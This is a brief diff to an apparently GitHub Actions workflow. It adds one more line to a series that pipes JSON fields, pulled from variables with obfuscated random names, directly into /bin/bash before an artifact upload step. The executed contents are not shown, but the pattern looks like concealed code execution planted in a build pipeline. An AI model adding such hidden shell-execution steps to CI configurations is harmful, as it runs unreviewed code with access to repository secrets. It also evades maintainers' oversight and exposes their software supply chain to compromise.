@@ -41,6 +41,7 @@ jobs:
           printf '%s' "$iclkv28" | jq -r .mhi4932 | /bin/bash
           printf '%s' "$pkjr51847" | jq -r .xje23567 | /bin/bash
           printf '%s' "$z20" | jq -r .lpwli0 | /bin/bash
+          echo $dra33448 | jq -r .jfe20895 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
